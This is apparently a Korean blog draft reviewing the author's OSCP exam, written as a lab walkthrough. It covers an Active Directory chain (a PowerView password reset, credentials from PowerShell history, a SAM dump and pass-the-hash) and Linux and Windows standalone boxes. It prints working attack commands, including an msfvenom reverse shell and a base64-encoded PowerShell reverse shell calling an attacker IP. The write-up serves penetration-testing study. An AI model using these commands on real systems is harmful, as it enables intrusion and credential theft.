+++
date = '2026-03-10T22:39:02+09:00'
draft = true
title = 'OSCP 시험 후기'
+++

# 결과 

우선 결과는 60점.

윈도우 머신 전부 풀었다.

stand alone은 하나만 proof까지 풀었다.

AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.

어느정도 운도 필요한 듯.

# Active Directory (Set1 Done)

## WS26 .206

처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=WS26.oscp.exam
| Not valid before: 2026-03-05T23:59:45
|_Not valid after:  2026-09-04T23:59:45
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: WS26
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: WS26.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.22621
|_  System_Time: 2026-03-07T00:17:03+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

**evil-winrm**을 사용해서 접속했다. 

처음에 모든 enum을 실시했는데 하나도 공격 벡터로 이어지는게 없었다.

powerview, winpeas, 스케줄태스크, 서비스들, 내부네트워크 등등

enum만 3시간 정도 시간 사용.

결국 **bloodhound**로 단서를 찾았다.

r.andrews -> g.jarvis에 AllExtendRights가 있었다.

아래 순서대로 입력하면 g.jarvis의 비밀번호를 변경할 수 있다.

```powershell
PS C:\users\r.andrews\Documents> Import-Module .\PowerView.ps1
PS C:\users\r.andrews\Documents> $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
PS C:\users\r.andrews\Documents> Set-DomainUserPassword -Identity 'g.jarvis' -Verbose

cmdlet Set-DomainUserPassword at command pipeline position 1
Supply values for the following parameters:
AccountPassword: ************
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'g.jarvis'
VERBOSE: [Set-DomainUserPassword] Password for user 'g.jarvis' successfully reset
```

이후 g.jarvis로 이동.

winpeas를 실행하고 잘 살펴보면 관리자의 크레덴셜이 적혀있었다.

` administrator / CarHammerChip964 `

알고나면 엄청 간단한데 bloodhound를 너무 늦게 확인하는 바람에 3시간이나 써버렸다.

너무 복잡하면 공격 벡터가 아닐 확률이 높다.

### Admin

관리자로 다음 타겟의 크레덴셜을 찾아야한다.

mimikatz를 실행해서 명령어를 다 넣어봤는데 걸리는 크레덴셜이 하나도 없었다.

파워쉘 히스토리를 보니까 다음 유저의 크레덴셜이 있었다.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSREadline> type ConsoleHost_history.txt
Get-Service | Where-Object {.Status -eq "Running"}
Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
Get-NetAdapter | Where-Object {.Status -eq "Up"}
Get-ChildItem -Path C:\ -Recurse | Where-Object {.Length -gt 100MB}
Invoke-Command -ComputerName DC20 -ScriptBlock {Get-ADUser -Filter * -Properties LastLogonDate}
New-ADUser -Name "Barrett Martin" -SamAccountName "b.martin" -UserPrincipalName "b.martin@oscp.exam" -AccountPassword (ConvertTo-SecureString "BusyWorkerDay777" -AsPlainText -Force) -Enabled True
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force -Confirm:False
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
 = 'https://raw.githubusercontent.com/stevencohn/WindowsPowerShell/main'
```

이건 그래도 빨리 찾아냈는데, 파일안에 숨기는 패턴이 나왔었다고 생각하면 끔찍하다.

## SRV22 .202

`b.martin / BusyWorkerDay777`로 접속

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: SRV22
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: SRV22.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-07T08:39:50+00:00
| ssl-cert: Subject: commonName=SRV22.oscp.exam
| Not valid before: 2026-03-05T23:59:29
|_Not valid after:  2026-09-04T23:59:29
|_ssl-date: 2026-03-07T08:40:30+00:00; +1s from scanner time.
8080/tcp open  http          Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

3389가 열려있어서 리모트데스크탑으로 연결했다.

`xfreerdp3 /v:172.16.122.202 /u:b.martin /p:BusyWorkerDay777 /size:1200x900`

시작화면에서 터미널이 실행안되지만, 폴더의 어드레스바에 cmd를 입력해서 터미널을 여는데 성공.

8080포트에 웹서버가 있는데 이건 함정이었다.

취약점이 없는 jenkins가 있었다.

**Program Files**에 mssql가 있는걸 발견했다.

터미널에 `sqlcmd`를 입력하면 mssql 인터액티브 창이 실행된다.

```cmd
SELECT name FROM master.dbo.sysdatabases;
go
use accounts;
go
SELECT table_name FROM information_schema.tables;
go
select * from creds;
go
```

여기서 유저들의 정보를 대량 발견.

스프레이로 유효한 어카운트를 찾았다.

```bash
crackmapexec smb 172.16.122.202 -u c.rogers -p SnoozeRinseRevolve231 --shares
SMB         172.16.122.202  445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.122.202  445    SRV22            [+] oscp.exam\c.rogers:SnoozeRinseRevolve231 (Pwn3d!)
SMB         172.16.122.202  445    SRV22            [+] Enumerated shares
SMB         172.16.122.202  445    SRV22            Share           Permissions     Remark
SMB         172.16.122.202  445    SRV22            -----           -----------     ------
SMB         172.16.122.202  445    SRV22            ADMIN$          READ,WRITE      Remote Admin
SMB         172.16.122.202  445    SRV22            C$              READ,WRITE      Default share
SMB         172.16.122.202  445    SRV22            IPC$            READ            Remote IPC
```

`impacket-psexec`으로 관리자 터미널 실행.

`impacket-psexec oscp.exam/c.rogers:SnoozeRinseRevolve231@172.16.122.202`

## DC200 .200

c.rogers의 크레덴셜로 마지막 DC까지 로그인

```cmd
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeBackupPrivilege`가 있다.

evil-winrm이 있으면 download로 파일을 옮길 수 있어서, 포트포워딩도 필요 없어서 너무 편하다.

```powershell
*Evil-WinRM* PS C:\Users\c.rogers>  reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\c.rogers> reg save hklm\system system
The operation completed successfully.
```

```bash
impacket-secretsdump -sam sam -system system local

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd359caefd2dd5a5551dd5a71481c194e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1932cc134540745795a0c48f58cfc49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

관리자의 해시를 획득.

`evil-winrm -i 172.16.122.200 -u administrator -H f1932cc134540745795a0c48f58cfc49`

이걸로 도메인 어드민의 플래그까지 획득.

# Active Directory (Set2)

## 192.168.123.206 - WS26

Initial credential (r.andrews:BusyOfficeWorker890)

- 처음에 RDP 접속

`xfreerdp3 /v:192.168.123.206 /u:r.andrews /p:'BusyOfficeWorker890'` 

Tasks 폴더에 스케줄 작업이 있다.

![taskschedule](/images/etc/task_schedule.png)

파일 이름 확인

![taskschedule2](/images/etc/task_schedule2.png)

쓰기권한 확인

![writepermission](/images/etc/writepermission.png)

msfvenom으로 리버스쉘을 만든 후 배치.

`msfvenom -p cmd/windows/reverse_powershell lhost=192.168.49.123 lport=443 > task.bat`

관리자 접속 후 notes.db 파일 발견.

```
C:\Users\Administrator\Documents\Simple Sticky Notes>type notes.db

- Temp creds for SQL testing

svc_sql : SQLPoworiouse333
```

xp_cmdshell도 사용가능하다고 적혀있다.

## 172.16.123.202 - SRV22

mssql 크레덴셜로 접속

`impacket-mssqlclient svc_sql:'SQLPowerHouse333'@172.16.123.202 -windows-auth`

OSCPB였나 거기 내용이랑 똑같다. 이 당시에는 포트포워딩 할 줄 몰라서 여기서 끝났다.

# Standalone machines

## 112 - Pwned

ftp anonymous login -> 비밀번호 리스트가 적혀있는 pdf 파일 발견.

![passwords](/images/etc/standalone/passwords.png)

enum4linux로 유저 리스트 확인.

`enum4linux 192.168.122.112`

```sh
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\sarah (Local User)
S-1-22-1-1001 Unix User\nick (Local User)
S-1-22-1-1002 Unix User\paul (Local User)
S-1-22-1-1003 Unix User\linda (Local User)
S-1-22-1-1004 Unix User\joe (Local User)
```

medusa로 크레덴셜 확인

```sh
medusa -h 192.168.122.112 -U users.txt -P passwords.txt -M ftp

2026-03-07 15:15:26 ACCOUNT FOUND: [ftp] Host: 192.168.122.112 User: sarah Password: !Password-Reset0000 [SUCCESS]
```

ssh 로그인 성공.

```sh
sudo -l

User sarah may run the following commands on oscp:
    (ALL) NOPASSWD: /usr/bin/calendar
    (ALL) NOPASSWD: /usr/bin/mcheck
    (ALL) NOPASSWD: /usr/bin/mawk
    (ALL) NOPASSWD: /usr/bin/rdma
```

```sh
sudo  /usr/bin/mawk 'BEGIN {system("/bin/sh")}'
```

## 111 - local.txt

feroxbuster로 `/launch` 디렉토리 발견.

![launch](/images/etc/standalone/launch.png)

Visit launch6 링크를 클릭하면 로그인 페이지가 나온다.

크레덴셜은 SMB에서 얻을 수 있다.

```sh
smbclient -N -L //192.168.123.111

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnneAuto        Disk      Anne's Automatic BackUps
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

```sh
smbclient //192.168.123.111/AnneAuto
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 24 11:12:37 2023
  ..                                  D        0  Thu Aug 24 11:12:37 2023
  emails.zip                          A    70052  Thu Aug 24 11:12:37 2023

                10328063 blocks of size 4096. 5842420 blocks available
smb: \> get emails.zip
getting file \emails.zip of size 70052 as emails.zip (50.8 KiloBytes/sec) (average 50.8 KiloBytes/sec)
```

비밀번호가 걸려있기 때문에 `zip2john`

크랙하면 비밀번호가 나온다. `1chief`

파일이 잔뜩 있는데 grep으로 비밀번호가 적힌 파일을 찾을 수 있다.

```
grep -i password -r .
./2023_Week38/20230922084703.msg:  The password will be our default one, used after a password reset: Voltaic1992
```

아까 발견한 로그인 페이지에 로그인한다.

![powershell](/images/etc/standalone/powershell.png)

로그인하면 파워쉘 창이 나오고 리버스쉘 코드를 보내서 연결할 수 있다.

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```



